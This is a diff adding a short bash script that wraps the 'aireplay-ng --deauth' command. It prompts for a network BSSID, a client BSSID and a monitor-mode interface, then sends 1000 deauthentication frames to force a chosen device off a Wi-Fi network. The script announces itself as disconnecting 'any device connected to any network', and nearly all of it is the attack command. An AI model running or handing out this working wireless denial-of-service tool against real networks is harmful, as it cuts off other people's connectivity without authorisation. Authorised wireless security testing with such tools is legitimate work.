@@ -1,0 +1,13 @@
+#!/bin/bash
+echo "Script Description: This script will use 'aireplay-ng' to disconnect any device connected to any network"
+./PacketSniffing
+echo ~~Enter the following parameters :
+read -p "	Network BSSID: " nBSSID
+read -p "	Client BSSID: " cBSSID
+read -p "	Inteface name in monitor mode: " interfaceName
+echo ~~Starting the attack \"aireplay-ng --deauth 1000 -a $nBSSID -c $cBSSID $interfaceName\"
+aireplay-ng --deauth 1000 -a $nBSSID -c $cBSSID $interfaceName
+
+
+
+
